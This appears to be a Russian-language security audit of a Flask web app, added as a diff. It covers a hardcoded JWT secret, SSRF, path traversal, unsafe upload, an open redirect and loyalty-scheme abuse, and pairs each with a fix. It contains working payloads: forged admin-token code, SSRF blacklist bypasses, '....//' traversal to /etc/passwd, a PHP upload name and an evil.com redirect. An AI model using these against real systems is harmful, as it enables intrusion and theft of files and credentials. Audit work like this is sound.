@@ -1,0 +1,540 @@
+Файл: `app.py`
+
+Что увидели:
+
+* JWT подписывается через HS256.
+* Secret захардкожен.
+* Secret слабый:
+
+```python
+JWT_SECRET = "funkymonkey"
+```
+
+---
+
+ Уязвимость: Forged JWT / Authentication Bypass
+
+ Почему уязвимо
+
+JWT:
+
+* полностью доверяется сервером;
+* не проверяется в БД;
+* подписывается слабым secret.
+
+Следовательно:
+
+* можно самостоятельно подписать admin token.
+
+---
+
+ Максимальный риск
+
+ Full Admin Takeover
+
+Доступ к:
+
+```text
+/api/admin/users
+/api/admin/upload
+/api/admin/view
+/api/admin/create_product
+```
+
+Потенциально:
+
+* чтение файлов;
+* SSRF;
+* компрометация инфраструктуры.
+
+---
+
+ Эксплуатация
+
+ Payload
+
+```python
+import jwt
+
+jwt.encode(
+ {
+   "sub":"admin",
+   "role":"admin"
+ },
+ "funkymonkey",
+ algorithm="HS256"
+)
+```
+
+---
+
+ Использование
+
+```http
+Cookie: token=FORGED_TOKEN
+```
+
+---
+
+ Почему это работает
+
+Проверка:
+
+```python
+g.user = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
+```
+
+Backend:
+
+* доверяет payload;
+* не валидирует session;
+* не проверяет пользователя повторно.
+
+---
+
+ Рекомендации
+
+ Плохо
+
+```python
+JWT_SECRET = "funkymonkey"
+```
+
+---
+
+ Нормально
+
+```python
+JWT_SECRET = os.environ["JWT_SECRET"]
+```
+
+Дополнительно:
+
+* длинный random secret;
+* secret rotation;
+* session invalidation.
+
+ SSRF — `/api/admin/create_product`
+
+Что увидели:
+
+```python
+target = urllib.request.urlopen(reviews)
+```
+
+URL полностью контролируется пользователем.
+
+Защита:
+
+```python
+scheme in block_schemes
+host in block_host
+```
+
+Blacklist-based filtering.
+
+---
+
+ Уязвимость: SSRF
+
+ Почему уязвимо
+
+Blacklist SSRF protection:
+
+* обходится;
+* не проверяет реальный IP;
+* не проверяет redirects;
+* не делает DNS validation.
+
+---
+
+ Максимальный риск
+
+ Internal Network Access
+
+Можно:
+
+* ходить во внутренние сервисы;
+* читать internal API;
+* атаковать metadata endpoints;
+* сканировать инфраструктуру.
+
+Потенциально:
+
+* cloud credential theft;
+* lateral movement;
+* takeover инфраструктуры.
+
+---
+
+ Эксплуатация
+
+ Payload
+
+```json
+{
+  "description":"test",
+  "price":100,
+  "reviews":"http://2130706433:5000/metrics"
+}
+```
+
+---
+
+ Почему работает
+
+Обход blacklist:
+
+```text
+127.1
+2130706433
+0x7f000001
+127.0.0.1.nip.io
+```
+
+Backend сравнивает строки, а не real destination IP.
+
+---
+
+ Рекомендации
+
+Не использовать blacklist.
+
+Нужно:
+
+* allowlist;
+* DNS resolution validation;
+* блокировка private/internal IP;
+* запрет redirects.
+
+ Arbitrary File Read — `/api/admin/view`
+
+Что увидели:
+
+```python
+filename = filename.replace("../", "")
+```
+
+---
+
+ Уязвимость: Path Traversal
+
+ Почему уязвимо
+
+Replace:
+
+```python
+.replace("../", "")
+```
+
+не является безопасной защитой.
+
+Обходы:
+
+```text
+....//
+..%2f
+..%252f
+```
+
+---
+
+ Максимальный риск
+
+ Arbitrary File Read
+
+Можно читать:
+
+```text
+/etc/passwd
+.env
+sqlite.db
+source code
+SSH keys
+```
+
+---
+
+ Эксплуатация
+
+ Payload
+
+```http
+GET /api/admin/view?file=....//....//etc/passwd
+```
+
+---
+
+ Почему это работает
+
+Нет:
+
+* realpath validation;
+* canonicalization;
+* проверки выхода из upload directory.
+
+---
+
+ Рекомендации
+
+ Нормально
+
+```python
+real = os.path.realpath(filepath)
+base = os.path.realpath(UPLOAD_FOLDER)
+
+if not real.startswith(base):
+    deny()
+```
+
+ Arbitrary File Upload — `/api/admin/upload`
+
+Что увидели:
+
+```python
+ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "gif", "txt", "pdf"}
+```
+
+Проверяется только extension.
+
+---
+
+ Уязвимость: Unsafe File Upload
+
+ Почему уязвимо
+
+Нет:
+
+* MIME validation;
+* content validation;
+* random filename;
+* sandbox.
+
+---
+
+ Максимальный риск
+
+ Stored XSS / Potential RCE
+
+Если uploads доступны через web:
+
+* возможен stored XSS;
+* polyglot upload;
+* overwrite файлов.
+
+---
+
+ Эксплуатация
+
+ Payload
+
+```text
+shell.php.jpg
+```
+
+или:
+
+```html
+<script>alert(1)</script>
+```
+
+внутри `.txt`.
+
+---
+
+ Рекомендации
+
+Нужно:
+
+* проверять MIME;
+* генерировать random filename;
+* хранить uploads вне web root.
+
+ Open Redirect — `/go`
+
+Что увидели:
+
+```python
+("Location", target)
+```
+
+URL полностью контролируется пользователем.
+
+---
+
+ Уязвимость: Open Redirect
+
+ Максимальный риск
+
+Можно:
+
+* делать phishing;
+* красть OAuth codes;
+* обходить allowlists.
+
+---
+
+ Эксплуатация
+
+ Payload
+
+```text
+/go?url=https://evil.com
+```
+
+---
+
+ Рекомендации
+
+Разрешать:
+
+* только relative paths;
+* либо allowlist domains.
+
+ Broken Loyalty Logic — `/api/bind_old_orders`
+
+Что увидели:
+
+```python
+SELECT id FROM orders where phone_number = ?
+```
+
+Привязка строится только на phone number.
+
+---
+
+ Уязвимость: Business Logic Abuse
+
+ Почему уязвимо
+
+Нет:
+
+* SMS verification;
+* ownership verification.
+
+Backend полностью доверяет номеру телефона.
+
+---
+
+ Максимальный риск
+
+ Discount Fraud
+
+Можно:
+
+* привязать чужие заказы;
+* получить максимальную скидку;
+* воровать loyalty benefits.
+
+---
+
+ Эксплуатация
+
+ Payload
+
+```json
+{
+  "phone_number":"+79991234567"
+}
+```
+
+---
+
+ Дополнительная проблема
+
+Frontend restriction:
+
+```javascript
+localStorage.setItem(BIND_FLAG_KEY, 'true')
+```
+
+Это:
+
+* client-side only;
+* легко обходится через DevTools.
+
+---
+
+ Рекомендации
+
+Нужно:
+
+* SMS verification;
+* backend-side validation;
+* не доверять frontend state.
+
+ Итоговые цепочки атак
+
+ Цепочка №1
+
+```text
+Weak JWT Secret
+    ->
+Forge Admin JWT
+    ->
+Admin Access
+    ->
+SSRF/File Read/File Upload
+```
+
+---
+
+ Цепочка №2
+
+```text
+Forge Admin JWT
+    ->
+/api/admin/view
+    ->
+Read sqlite.db/.env/source code
+    ->
+Further compromise
+```
+
+---
+
+ Цепочка №3
+
+```text
+Forge Admin JWT
+    ->
+SSRF
+    ->
+Internal network access
+    ->
+Infrastructure compromise
+```
+
+---
+
+ Цепочка №4
+
+```text
+Phone number abuse
+    ->
+Bind чужих заказов
+    ->
+Получение максимальной скидки
+    ->
+Business Logic Abuse
+```
+
+---
+
+Общая оценка
+
+Критические проблемы:
+
+* hardcoded JWT secret;
+* SSRF;
+* arbitrary file read;
+* unsafe upload.
+* open redirect;
+* broken business logic.
+
+Приложение позволяет:
+
+* получить admin;
+* читать файлы сервера;
+* атаковать внутреннюю сеть;
+* злоупотреблять бизнес-логикой.
